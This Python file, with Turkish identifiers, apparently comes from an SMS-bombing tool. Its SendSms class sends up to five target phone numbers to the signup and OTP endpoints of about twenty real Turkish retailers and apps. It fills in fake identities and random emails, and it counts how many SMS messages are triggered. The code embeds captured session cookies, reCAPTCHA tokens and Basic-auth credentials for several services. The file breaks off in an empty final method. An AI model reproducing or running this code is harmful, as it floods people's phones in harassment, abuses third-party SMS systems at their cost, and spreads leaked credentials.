import requests

from random import choice

from string import ascii_lowercase

from bs4 import BeautifulSoup

from colorama import Fore, Style

from time import sleep



class SendSms():

    adet = 0

    toplam_sms = 1

    

   

    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):

        self.phone = str(phone)

        self.phone2 = str(phone2)

        self.phone3 = str(phone3)

        self.phone4 = str(phone4)

        self.phone5 = str(phone5)

        if len(mail) != 0:

            self.mail = mail

        else:

            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"

            

    

    





    # dsmartgo.com.tr

    def Dsmartgo(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={

        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",

        	        "IsSubscriber": "true",

        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",

        	        "Mobile": numara,

                }, cookies={

        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		    "_ga": "GA1.3.1016548678.1638216163",

        		    "_gat": "1",

        		    "_gat_gtag_UA_18913632_14": "1",

        		    "_gid": "GA1.3.1214889554.1638216163",

        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"

        	    })

            try:

                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()

                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")

            except AttributeError:

                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                self.adet += 1

                self.toplam_sms += 1

            uygulanan_nolar += 1

            if uygulanan_nolar == bos_olmayan:

                break

            else:

                continue

        




    #kahvedunyasi.com

    def KahveDunyasi(self):    

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={

                    "mobile_number": numara,

                    "token_type": "register_token"

                })

                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise 

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

        



    #naosstars.com

    def NaosStars(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={

                    "email": self.mail,

                    "first_name": "Memati",

                    "last_name": "Bas",

                    "password": "31ABC..abc31",

                    "date_of_birth": "1975-12-31",

                    "phone": f"0{numara}",

                    "gender": "male",

                    "kvkk": "true",

                    "contact": "true",

                    "confirm": "true"

                })

                    if naosstars.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                       raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

                else:

                    continue

          
   


    #bim

    def Bim(self):         

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})

                    if bim.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

        


    #a101.com.tr

    def A101(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.a101.com.tr:443/users/otp-login/"

                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}

                    r = requests.post(url,data=data)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    #englishhome.com

    def Englishhome(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}

                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)

                    if home.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            


    #boyner.com

    def Boyner(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"

                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}

                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}

                    r = requests.post(url, headers=headers, json=json)

                    if r.json()["Success"] == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            

    

    #buyursungelsin.com

    def Buyur(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"

                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}

                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"

                    r = requests.post(url, headers=headers, data=data)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

    #idealdata.com.tr

    def Osmanlideal(self):





        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    #KimGbIster

    def KimGb(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue





    #ikinciyeni.com

    def IkinciYeni(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"

                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["isSucceed"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            


    #ipragaz.com.tr

    def IpraGaz(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"

                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}

                    r = requests.post(url, json=json)

                    if (r.json()["phoneNumber"]) == str(numara):

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

             

    #mogazmobilapinew.aygaz.com.tr

    def Mogaz(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"

                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}

                    r = requests.post(url, json=json)

                    if (r.json()["messageCode"]) == "OK":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue  

            


    #petrolofisi.com.tr

    def PetrolOfisi(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"

                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}

                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}

                    r = requests.post(url, headers=headers, json=json)

                    if r.status_code == 204:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    



    #tazi.tech

    def Tazi(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"

                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}

                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.json()["kod"]) == "0000":

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    #n11.com

    def N11(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"

                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}

                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.json()["isSuccess"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    


    #sakasu.com.tr

    def Saka(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"

                    json={"gsm": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["status"]) == 1 :

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

    #gofody.com

    def Gofody(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"

                    json={"country_code": "90", "phone": numara}

                    r = requests.post(url, json=json)

                    if (r.json()["success"]) == True:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue





    #madamecoco.com

    def Madame(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.madamecoco.com:443/users/registration/"

                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}

                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"

                    r = requests.post(url, headers=headers, data=data)

                    if (r.status_code) == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

            

    #balikesiruludag.com.tr

    def Buludag(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")

                    if r.status_code == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

    #evidea.com

    def Evidea(self):

            

